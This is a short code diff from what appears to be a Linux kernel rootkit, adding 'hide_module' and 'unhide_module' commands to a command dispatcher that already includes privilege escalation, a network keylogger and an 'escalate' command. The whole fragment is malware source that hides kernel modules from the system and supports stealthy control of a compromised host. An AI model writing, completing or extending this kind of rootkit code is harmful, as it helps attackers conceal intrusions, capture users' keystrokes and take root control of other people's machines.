@@ -5,6 +5,7 @@
 #include "include.h"
 #include "privilege_escalation.h"
 #include "net_keylog.h"
+#include "hide_module.h"
 
 static int state = 0;
 static int cstate = 0;
@@ -77,8 +78,14 @@ execute_command (void)
 		}
 		
 	} else if(strcmp(command_buffer, "hide_module") == 0) {
+		if(param_counter > 0) {
+			hide_module_byname(param_buffer);
+		}
 		
 	} else if(strcmp(command_buffer, "unhide_module") == 0) {
+		if(param_counter > 0) {
+			unhide_module_byname(param_buffer);
+		}
 		
 	} else if(strcmp(command_buffer, "escalate") == 0) {
 		priv_escalation();
